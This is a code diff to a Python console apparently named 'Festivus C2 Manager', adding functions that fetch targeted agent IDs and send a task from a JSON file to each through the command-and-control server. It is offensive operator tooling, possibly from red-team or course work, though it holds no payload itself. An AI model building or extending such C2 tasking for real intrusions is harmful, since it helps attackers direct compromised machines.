@@ -20,12 +20,23 @@ def set_targets(ips):
     data = {"ips": ips}
     r = requests.post(f"{URL}/set-targets", json=data)
 
+def get_targets():
+    r = requests.get(f"{URL}/targets")
+    return r.text.split("\n")
+
 def untarget(ips):
     data = {"ips": ips}
     r = requests.post(f"{URL}/untarget", json=data)
 
 def clear_targets():
     r = requests.post(f"{URL}/clear-targets")
+
+def post_task(json_filename):
+    with open(json_filename, "r") as f:
+        json_data = json.load(f)
+        for target in get_targets():
+            json_data['agent_id'] = target
+            r = requests.post(f"{URL}/make-task", json=json_data)
 
 def main():
     print("Festivus C2 Manager\n\n")
@@ -45,8 +56,7 @@ def main():
             for agent in agents:
                 print(f"{agent['agent_id']} - {agent['status']}")
         elif userin.upper().strip() == "SHOW TARGETS":
-            r = requests.get(f"{URL}/targets")
-            targets = r.text.split("\n")
+            targets = get_targets()
             print("Targets:")
             for target in targets:
                 print(target)
